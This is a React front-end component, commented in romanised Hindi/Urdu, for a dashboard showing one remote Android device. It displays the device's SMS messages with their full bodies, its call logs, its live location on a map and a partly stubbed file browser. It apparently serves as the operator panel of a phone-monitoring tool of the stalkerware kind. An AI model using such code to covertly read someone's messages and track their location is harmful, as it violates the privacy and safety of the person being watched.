import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { io } from 'socket.io-client';
import {
    Container,
    Typography,
    Box,
    Tabs,
    Tab,
    Paper,
    Grid,
    CircularProgress,
    List,
    ListItem,
    ListItemText,
    ListItemIcon,
    Button,
    IconButton,
    Divider,
} from '@mui/material';
import {
    PhoneAndroid,
    BatteryChargingFull,
    SignalWifi4Bar,
    LocationOn,
    Sms,
    Phone,
    Folder,
    Refresh,
} from '@mui/icons-material';

// Socket.IO server se connection
const socket = io('http://localhost:5000');

// Helper function to create a TabPanel
function TabPanel(props) {
    const { children, value, index, ...other } = props;
    return (
        <div role="tabpanel" hidden={value !== index} {...other}>
            {value === index && (
                <Box sx={{ p: 3 }}>
                    {children}
                </Box>
            )}
        </div>
    );
}

const DeviceDetails = () => {
    const { id: deviceId } = useParams(); // URL se deviceId hasil karna
    const navigate = useNavigate();

    const [device, setDevice] = useState(null);
    const [smsLogs, setSmsLogs] = useState([]);
    const [callLogs, setCallLogs] = useState([]);
    const [files, setFiles] = useState([]);
    const [location, setLocation] = useState({ latitude: 'N/A', longitude: 'N/A' });
    const [loading, setLoading] = useState(true);
    const [tabIndex, setTabIndex] = useState(0);

    // Data fetch karne ke liye function
    const fetchData = async () => {
        setLoading(true);
        try {
            const token = localStorage.getItem('token');
            if (!token) {
                navigate('/login'); // Agar token nahi to login par bhej do
                return;
            }
            const config = { headers: { 'x-auth-token': token } };

            // Backend se alag alag data endpoints se data fetch karen
            const deviceRes = await axios.get(`http://localhost:5000/api/devices/${deviceId}`, config);
            const smsRes = await axios.get(`http://localhost:5000/api/data/${deviceId}/sms`, config);
            const callRes = await axios.get(`http://localhost:5000/api/data/${deviceId}/calls`, config);
            
            setDevice(deviceRes.data);
            setSmsLogs(smsRes.data);
            setCallLogs(callRes.data);
            setLocation(deviceRes.data.location || { latitude: 'N/A', longitude: 'N/A' });

        } catch (error) {
            console.error("Failed to fetch data", error);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchData();

        // Socket.IO listeners
        socket.emit('joinRoom', deviceId);

        socket.on('locationUpdated', (newLocation) => {
            console.log('Live location received:', newLocation);
            setLocation({ latitude: newLocation.latitude, longitude: newLocation.longitude });
        });
        
        // Cleanup function
        return () => {
            socket.off('locationUpdated');
            // socket.emit('leaveRoom', deviceId); // Optional
        };
    }, [deviceId, navigate]);

    const handleTabChange = (event, newValue) => {
        setTabIndex(newValue);
    };

    if (loading) {
        return (
            <Container sx={{ display: 'flex', justifyContent: 'center', mt: 5 }}>
                <CircularProgress />
            </Container>
        );
    }

    if (!device) {
        return <Typography variant="h5" align="center" sx={{ mt: 5 }}>Device not found.</Typography>;
    }

    return (
        <Container maxWidth="lg" sx={{ mt: 4, mb: 4 }}>
            <Paper elevation={3} sx={{ p: 3 }}>
                <Typography variant="h4" gutterBottom>{device.deviceModel}</Typography>
                <Typography variant="subtitle1" color="text.secondary">Device ID: {device.deviceId}</Typography>
                <Divider sx={{ my: 2 }} />

                <Box sx={{ borderBottom: 1, borderColor: 'divider' }}>
                    <Tabs value={tabIndex} onChange={handleTabChange} variant="scrollable" scrollButtons="auto">
                        <Tab label="Info" icon={<PhoneAndroid />} iconPosition="start" />
                        <Tab label="Location" icon={<LocationOn />} iconPosition="start" />
                        <Tab label="SMS" icon={<Sms />} iconPosition="start" />
                        <Tab label="Call Logs" icon={<Phone />} iconPosition="start" />
                        <Tab label="File Manager" icon={<Folder />} iconPosition="start" />
                    </Tabs>
                </Box>

                {/* Info Tab */}
                <TabPanel value={tabIndex} index={0}>
                    <Grid container spacing={2}>
                        <Grid item xs={12} md={6}>
                            <List>
                                <ListItem>
                                    <ListItemIcon><PhoneAndroid /></ListItemIcon>
                                    <ListItemText primary="Android Version" secondary={device.androidVersion || 'N/A'} />
                                </ListItem>
                                <ListItem>
                                    <ListItemIcon><BatteryChargingFull /></ListItemIcon>
                                    <ListItemText primary="Battery" secondary={`${device.battery?.level || 'N/A'}% ${device.battery?.isCharging ? '(Charging)' : ''}`} />
                                </ListItem>
                                <ListItem>
                                    <ListItemIcon><SignalWifi4Bar /></ListItemIcon>
                                    <ListItemText primary="Network" secondary={`${device.network?.name || 'N/A'} - WiFi: ${device.network?.wifiStatus || 'N/A'}`} />
                                </ListItem>
                            </List>
                        </Grid>
                    </Grid>
                </TabPanel>

                {/* Location Tab */}
                <TabPanel value={tabIndex} index={1}>
                    <Typography variant="h6">Live Location</Typography>
                    <Typography>Latitude: {location.latitude}</Typography>
                    <Typography>Longitude: {location.longitude}</Typography>
                    <IconButton color="primary" onClick={() => { /* Logic to request fresh location */ }}>
                        <Refresh />
                    </IconButton>
                    <Box mt={2} sx={{ height: '400px', backgroundColor: '#e0e0e0' }}>
                        {/* Yahan Google Map embed kiya ja sakta hai */}
                        <iframe
                            width="100%"
                            height="100%"
                            loading="lazy"
                            allowFullScreen
                            src={`https://www.google.com/maps/embed/v1/place?key=YOUR_GOOGLE_MAPS_API_KEY&q=${location.latitude},${location.longitude}`}>
                        </iframe>
                    </Box>
                </TabPanel>

                {/* SMS Tab */}
                <TabPanel value={tabIndex} index={2}>
                    <List>
                        {smsLogs.length > 0 ? smsLogs.map(log => (
                            <ListItem key={log._id}>
                                <ListItemText
                                    primary={`${log.type}: ${log.address}`}
                                    secondary={<>
                                        <Typography component="span" variant="body2">{log.body}</Typography>
                                        <br />
                                        <Typography component="span" variant="caption">{new Date(log.date).toLocaleString()}</Typography>
                                    </>}
                                />
                            </ListItem>
                        )) : <Typography>No SMS logs found.</Typography>}
                    </List>
                </TabPanel>

                {/* Call Logs Tab */}
                <TabPanel value={tabIndex} index={3}>
                    {/* Call Logs ki list yahan display karen */}
                </TabPanel>

                {/* File Manager Tab */}
                <TabPanel value={tabIndex} index={4}>
                    <Button variant="contained" startIcon={<Refresh />}>Refresh Files</Button>
                    <List>
                        {/* Files ki list yahan display karen thumbnails aur download button ke sath */}
                        <ListItem>
                            <ListItemIcon><Folder /></ListItemIcon>
                            <ListItemText primary="DCIM" />
                        </ListItem>
                        <ListItem>
                            <ListItemIcon><Folder /></ListItemIcon>
                            <ListItemText primary="Downloads" />
                        </ListItem>
                    </List>
                </TabPanel>

            </Paper>
        </Container>
    );
};

export default DeviceDetails;
